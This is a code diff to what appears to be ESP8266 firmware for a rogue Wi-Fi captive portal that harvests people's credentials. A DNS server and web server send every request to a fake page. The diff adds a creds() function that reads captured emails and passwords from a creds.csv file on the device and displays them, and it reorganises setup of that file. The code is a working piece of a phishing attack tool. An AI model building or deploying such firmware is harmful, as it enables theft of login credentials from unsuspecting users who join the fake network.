@@ -50,8 +50,33 @@ String header(String t) {
     "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h3>"+t+"</h3></div><div>";
   return h; }
 
+// read credentials from csv
 String creds() {
-  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+    String credHTML = "";
+    
+    // read csv file and construct html string 
+    Serial.println("Reading creds.csv database");
+    File credDB = SPIFFS.open("/creds.csv", "r");
+    char buffer[64];
+    while (credDB.available()) {
+        int l = credDB.readBytesUntil('\n', buffer, sizeof(buffer));
+        buffer[l] = 0;
+        
+        // split username and password
+        String tmpHTML = buffer;
+
+        credHTML+="<h3>Email:</h3>";
+        credHTML+="<p>"+tmpHTML.substring(0,tmpHTML.indexOf(","))+"</p>";
+        credHTML+="<h3>Password:</h3>";
+        credHTML+="<p>"+tmpHTML.substring(tmpHTML.indexOf(",")+1,tmpHTML.length())+"</p>";
+
+
+    }
+    credDB.close();
+    return credHTML;
+    // Serial.println(credHTML);
+    
+//   return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
 
 String index() {
@@ -91,17 +116,6 @@ String clear() {
   String email="<p></p>"; 
   String password="<p></p>";
   Credentials="<p></p>";
-    //  
-
-    // if (!creds) {
-    //     Serial.println("There was an error opening the file for writing");
-    //     return;
-    // }
-    // else {
-    //     Serial.println("Opened creds!");
-    // }
-
-    // creds.close();
   return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
@@ -135,17 +149,30 @@ void setup() {
     webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
     webServer.begin();
 
+    fileSetup();
+
     pinMode(BUILTIN_LED, OUTPUT);
     digitalWrite(BUILTIN_LED, HIGH);
+}
 
+
+void loop() { 
+    if ((millis()-lastTick)>TICK_TIMER) { lastTick=millis(); } 
+    dnsServer.processNextRequest(); webServer.handleClient(); 
+    delay(0);
+}
+
+
+/** DEFAULT FILE SETUP **/
+void fileSetup() {
     // check if creds.csv & recon.csv exists
     // if not, create the files and append csv headers
 
     if (!SPIFFS.exists("/creds.csv")) {
         Serial.println("\nDatabase creds.csv not found, creating new file.");
-        File creds = SPIFFS.open("/creds.csv", "w");
-        creds.println("email,password");
-        creds.close();
+        File tmpCreds = SPIFFS.open("/creds.csv", "w");
+        tmpCreds.println("email,password");
+        tmpCreds.close();
     }
     else {
         Serial.println("\nDatabase creds.csv found! Reading creds:");
@@ -155,10 +182,19 @@ void setup() {
         }
         tmpCreds.close();
     }    
-}
 
-
-void loop() { 
-    if ((millis()-lastTick)>TICK_TIMER) { lastTick=millis(); } 
-    dnsServer.processNextRequest(); webServer.handleClient(); 
+    // if (!SPIFFS.exists("/recon.csv")) {
+    //     Serial.println("\nDatabase creds.csv not found, creating new file.");
+    //     File tmpCreds = SPIFFS.open("/creds.csv", "w");
+    //     tmpCreds.println("email,password");
+    //     tmpCreds.close();
+    // }
+    // else {
+    //     Serial.println("\nDatabase creds.csv found! Reading creds:");
+    //     File tmpCreds = SPIFFS.open("/creds.csv", "r");
+    //     while (tmpCreds.available()) {
+    //         Serial.write(tmpCreds.read());
+    //     }
+    //     tmpCreds.close();
+    // }   
 }
